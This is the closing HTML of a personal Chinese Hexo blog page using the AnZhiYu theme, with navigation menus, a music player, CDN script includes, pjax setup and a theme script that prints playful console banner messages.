id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">4</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://flyfish567.github.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.icons8.com/?size=100&amp;id=35cCJ0NU5XUV&amp;format=png&amp;color=000000" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://t.bilibili.com" title="Bilibili"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.icons8.com/?size=100&amp;id=5E24fZ9ORelo&amp;format=png&amp;color=000000" alt="Bilibili"/><span class="back-menu-item-text">Bilibili</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.nssctf.cn/contest" title="NSSCTF"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="NSSCTF"/><span class="back-menu-item-text">NSSCTF</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://chat.deepseek.com/" title="Deepseek"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.icons8.com/?size=100&amp;id=YWOidjGxCpFW&amp;format=png&amp;color=000000" alt="Deepseek"/><span class="back-menu-item-text">Deepseek</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 警示页</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/Warning/index.html"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 警告</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=12908278323&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/WP/" style="font-size: 0.88rem;">WP<sup>2</sup></a><a href="/tags/test/" style="font-size: 0.88rem;">test<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="12908278323" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/my/m/music/playlist?id=12908278323&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("23/05/2025 20:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2025 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 FLYFISH 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "flyfish567@qq.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="click-show-text" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,可爱喵,害羞喵,开心喵,生气喵,抑郁喵,讨厌喵,愤怒喵,好看喵,温柔喵,喜欢喵" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
